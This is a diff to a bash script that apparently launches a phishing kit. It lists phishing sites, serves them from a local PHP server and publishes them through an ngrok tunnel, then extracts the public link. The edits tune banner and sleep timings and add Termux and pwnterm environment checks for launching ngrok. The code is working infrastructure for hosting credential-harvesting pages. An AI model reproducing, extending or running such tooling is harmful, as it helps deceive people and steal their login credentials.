@@ -42,7 +42,7 @@ else
 fi
 #<<<---------banner---------->>>
 __banner__() {
-cat banner | pv -qL 300 | lolcat
+cat banner | pv -qL 700 | lolcat
 echo
 }
 #<<<----------Processbar---------->>>
@@ -145,7 +145,7 @@ R0="$(printf '\033[00m')"  R1="$(printf '\033[0;1m')"
 D0="$(printf '\033[77m')"
 #<<<-----------program---------->>>
 wait() {
-sleep 0.002
+sleep 0.001
 }
 __programs__() {
 printf "${B1}List of phising sites${R1}\n"; wait
@@ -263,12 +263,21 @@ printf "${C2}..........${R0}\n" | pv -qL 10
 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 sleep 3
 echo
+appl=$(pwd)
 if [[ $distro == *'Android'* ]]; then
+  if [[ ${appl} == *'com.termux'* ]]; then
 termux-chroot ngrok http 4444 > /dev/null 2>&1 &
+  else
+    ngrok http 4444 > /dev/null 2>&1 &
+  fi
 else
 sudo ngrok http 4444 > /dev/null 2>&1 &
 fi
+if [[ ${appl} == *'hilled.pwnterm'* ]]; then
+sleep 15
+else
 sleep 7
+fi
 echo
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 echo; wait
